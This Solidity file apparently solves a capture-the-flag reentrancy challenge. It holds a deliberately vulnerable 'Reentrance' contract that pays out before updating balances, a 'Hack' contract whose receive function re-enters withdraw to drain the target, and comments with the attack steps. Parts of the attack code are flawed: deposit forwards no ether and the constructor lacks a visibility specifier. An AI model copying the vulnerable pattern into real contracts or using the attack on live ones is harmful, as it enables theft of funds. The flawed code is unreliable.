// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}


contract Hack {

    Reentrance reent;
    uint bal;
    constructor(address payable _add) {
        reent = Reentrance(_add);
        bal = address(_add).balance;
    }

    function deposit(address _add) public {
        reent.donate(_add);
    }

    function take(uint _amt) public {
        reent.withdraw(_amt);
    }

    receive() external payable {
        reent.withdraw(bal);
    }
}

// i) Deposit 0.001 ether to given contract from Hack contract's balance.
// ii) Call take of Hack by passing 0.001 ether.
// Explanation: When you call take of contract Hack, it calls withdraw of reentrancy contract which calls receive of Hack contract to send ether. But receive of 
// Hack calls withdraw again, which again will call receive and thus, balance of reentrancy contract decreases to zero.
